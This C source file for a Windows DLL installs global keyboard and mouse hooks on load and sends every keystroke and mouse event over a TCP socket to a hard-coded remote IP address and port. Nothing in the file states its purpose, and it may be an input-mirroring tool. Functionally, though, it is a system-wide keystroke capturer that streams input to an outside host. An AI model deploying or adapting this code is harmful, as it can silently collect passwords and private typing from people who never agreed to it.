#include <WinSock2.h>
#include <windows.h>
#include <stdio.h>
#include <strsafe.h>
#include "net.h"

#define IsBitSet(val, bit) ((val) & (1 << (bit)))
//#define WM_KEYDOWN                      0x0100

#pragma data_seg("shared")
#pragma comment(linker, "/section:shared,rws")
#pragma data_seg()

int sSocket;
char srv_ip[MAX_IP_LEN] = "140.109.22.252";
char srv_port[MAX_PORT_LEN] = "5050";


HINSTANCE hinstDLL;

HHOOK hkKB;
HHOOK hkMS;
//HHOOK hkJR;
HWND gh_hwndMain;

LRESULT WINAPI KeyboardProc(int, WPARAM, LPARAM);
LRESULT WINAPI MouseProc(int, WPARAM, LPARAM);
//LRESULT WINAPI JournalRecordProc(int code,WPARAM wParam,LPARAM lParam);

BOOL SetHook()
{
	FILE *log = fopen("D:\\log\\log.txt","a+");
	hkMS = SetWindowsHookEx(WH_MOUSE, MouseProc, hinstDLL, 0);
	hkKB = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, hinstDLL, 0);
	//hkJR = SetWindowsHookEx(WH_JOURNALRECORD, JournalRecordProc, hinstDLL, 0);

	DWORD er = GetLastError();
	fprintf( log, "hook ms %p, kb %p,error %X\r\n",hkMS,hkKB,er );
	fflush(log);
	if(hkMS==NULL || hkKB==NULL){
		fclose(log);
		return FALSE;
	}
	fclose(log);

	return TRUE;
}

BOOL UnHook()
{	
	UnhookWindowsHookEx(hkMS);
	UnhookWindowsHookEx(hkKB);
	//UnhookWindowsHookEx(hkJR);
	return true;
}
bool check = false;

BOOL APIENTRY DllMain( HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
	hinstDLL = (HINSTANCE)hModule;
	
	if (ul_reason_for_call == DLL_PROCESS_ATTACH){
		DeleteFile(L"d:\\log\\input.txt");
		DeleteFile(L"d:\\log\\mouse.txt");
		//DeleteFile(L"d:\\log\\jr.txt");
		DeleteFile(L"d:\\log\\log.txt");
	WSADATA wsaData;
	if( SOCKET_ERROR == WSAStartup( WINSOCK_VERSION, &wsaData ) || wsaData.wVersion != WINSOCK_VERSION )
		return -1;
	
	sSocket = socket( AF_INET, SOCK_STREAM, 0 );

	struct sockaddr_in addr3;
	addr3.sin_family = AF_INET;
	addr3.sin_port = htons( atoi(srv_port) );
	addr3.sin_addr.S_un.S_addr = inet_addr(srv_ip);

	connect( sSocket , (struct  sockaddr *)&addr3, sizeof(struct sockaddr) );
	}else if (ul_reason_for_call == DLL_PROCESS_DETACH){
		closesocket( sSocket );
		WSACleanup();
	}
	//FILE *log = fopen("D:\\log\\log.txt","a+");
	//fprintf( log, "dll start!!\r\n",hkMS,hkKB );
	//fflush(log);
	/*
	if (ul_reason_for_call == DLL_PROCESS_ATTACH){

		hkMS = SetWindowsHookEx(WH_MOUSE, MouseProc, hinstDLL, 0);
		fprintf( log, "hook ms %p, kb %p\r\n",hkMS,hkKB );
		fflush(log);
		//hkKB = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, hinstDLL, 0);

    }else if (ul_reason_for_call == DLL_PROCESS_DETACH){
		UnhookWindowsHookEx(hkMS);
		UnhookWindowsHookEx(hkKB);
	}
	*/
	//fclose(log);
	
    return TRUE;
}

void LookUpTheMessage(PMSG pmsg, TCHAR* szMsg)
{
	DWORD message = pmsg->message;
	StringCchPrintf(szMsg, sizeof(DWORD), L"%x", message);
}
/**************************************************************** 
  WH_MOUSE hook procedure 
 ****************************************************************/ 
 
LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam) 
{ 

	FILE *fp = fopen("d:\\log\\mouse.txt","a+");
	
	//fprintf( fp, "nCode: %d , x: %d, y: %d\r\n",nCode, LOWORD(lParam), HIWORD(lParam) );
    if (nCode < 0 || nCode == 3)  // do not process the message 
        return CallNextHookEx(hkMS, nCode, wParam, lParam); 
 
    // Call an application-defined function that converts a message 
    // constant to a string and copies it to a buffer. 
 
    //LookUpTheMessage((PMSG) lParam, szMsg); 
	
	LPMOUSEHOOKSTRUCT mhs = (LPMOUSEHOOKSTRUCT)lParam;
    
	//hdc = GetDC(gh_hwndMain);
    //hResult = StringCchPrintf(szBuf, 128/sizeof(TCHAR), L"MOUSE - nCode: %d, msg: %s, x: %d, y: %d, %d times", 
	//	nCode, szMsg, mhs->pt.x, mhs->pt.y, c++);
	
	//fprintf( fp, "msg: %s\r\n",szMsg );

	//if( nCode == 0 )
	//	fprintf( fp, "wp %s,x: %d, y: %d,msg: %s,test = %d\r\n",wParam, mhs->pt.x, mhs->pt.y,szMsg,mhs->wHitTestCode );

	/*
    if (FAILED(hResult))
    {
    // TODO: write error handler
    }
    hResult = StringCchLength(szBuf, 128/sizeof(TCHAR), &cch);
    if (FAILED(hResult))
    {
    // TODO: write error handler
    }
    TextOut(hdc, 2, 95, szBuf, cch); 
    ReleaseDC(gh_hwndMain, hdc);
	*/

	

	INPUT input;
	//input.type = INPUT_MOUSE;
		
	input.type = INPUT_MOUSE;
	input.mi.dx = mhs->pt.x;
	input.mi.dy = mhs->pt.y;
	switch( wParam )
	{
	case WM_LBUTTONDOWN:
		input.mi.dwFlags = MOUSEEVENTF_LEFTDOWN;
		//fprintf( fp,"1");
		break;
	case WM_LBUTTONUP:
		input.mi.dwFlags = MOUSEEVENTF_LEFTUP;
		//fprintf( fp,"2");
		break;
	case WM_RBUTTONDOWN:
		input.mi.dwFlags = MOUSEEVENTF_RIGHTDOWN;
		//fprintf( fp,"3");
		break;
	case WM_RBUTTONUP:
		input.mi.dwFlags = MOUSEEVENTF_RIGHTUP;
		//fprintf( fp,"4");
		break;
	case WM_MOUSEMOVE:
		
		input.mi.dwFlags = MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE;
		
		//fprintf( fp,"5");
		break;
	case WM_NCMOUSEMOVE:
		
		input.mi.dwFlags = MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE;
		
		//fprintf( fp,"6");
		break;
	}
	//input.mi.dwFlags = wParam;
	input.mi.time = 0;
	//input.mi.dwExtraInfo = mhs->dwExtraInfo;
	input.mi.mouseData = 0;
	
	int len = send( sSocket, (char *)&input, sizeof(INPUT),0);
	fprintf( fp, "wp = %8x,x = %d, y = %d, flag = %8x,einfo = %d\n",wParam,input.mi.dx,input.mi.dy,input.mi.dwFlags,input.mi.dwExtraInfo );
	fclose(fp);
    
    return CallNextHookEx(hkMS, nCode, wParam, lParam); 
} 
 
/**************************************************************** 
  WH_KEYBOARD hook procedure 
 ****************************************************************/ 

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) 
{
	//float fTinput = GetTickCount();

	//DWORD delay = 1000;
			
	//FILE *fp = fopen("d:\\log\\input.txt","a+");

	//fprintf( fp, "kb event: 29 %c 30 %c 31 %c\r\n",IsBitSet(lParam, 29) ? '1' : '0',IsBitSet(lParam, 30) ? '1' : '0',IsBitSet(lParam, 31) ? '1' : '0' );
	
	bool prekey = IsBitSet(lParam, 30) ? '1' : '0';
	bool trakey = IsBitSet(lParam, 31) ? '1' : '0';

	if (nCode < 0 || nCode == 3 && nCode != HC_ACTION)
	{
		//fclose(fp);
		//return NULL;
        return CallNextHookEx(hkKB, nCode, wParam, lParam); 
	}

	if( !(prekey == 1 && trakey == 1) )
	{
		//fclose(fp);
		//return NULL;
        return CallNextHookEx(hkKB, nCode, wParam, lParam); 
	}
	/*
    hdc = GetDC(gh_hwndMain);
    hResult = StringCchPrintf(szBuf, 128/sizeof(TCHAR), L"KEYBOARD - nCode: %d, vk: %d, %d times lp %x %x"
		, nCode, wParam, c++, lParam >> 30,lParam >> 31);

	fprintf( fp, "kb input key: %d on %f",wParam ,fTinput );
	
    if (FAILED(hResult))
    {
    // TODO: write error handler
    } 
    hResult = StringCchLength(szBuf, 128/sizeof(TCHAR), &cch);
    if (FAILED(hResult))
    {
    // TODO: write error handler
    } 
    TextOut(hdc, 2, 115, szBuf, cch); 
    ReleaseDC(gh_hwndMain, hdc); 
	*/
	//fprintf( fp, " delay %d to ",delay );
	//Sleep(delay);
	//float fTOutput = GetTickCount();
	//fprintf( fp, " %f\r\n",fTOutput );
	

	bool extendedKey = (lParam & 0x1000000) == 0x1000000;
    bool keyup = (lParam & 0x80000000) == 0x80000000;
	DWORD dwFlag = (extendedKey ? KEYEVENTF_EXTENDEDKEY : 0) | (keyup ? KEYEVENTF_KEYUP : 0);
    //DWORD count = (DWORD)lParam & 0xFFFF;
	
	INPUT input;
	input.type = INPUT_KEYBOARD;
	input.ki.wVk = wParam;
	input.ki.wScan = wParam;
	input.ki.dwFlags = dwFlag;
	input.ki.dwExtraInfo = NULL;
	input.ki.time = 0;

	int len = send( sSocket, (char *)&input, sizeof(INPUT),0);
	//fprintf( fp, "len = %d,error %d\n",len,WSAGetLastError() );
	//fclose(fp);


	//return NULL;
	return CallNextHookEx(hkKB, nCode, wParam, lParam);
}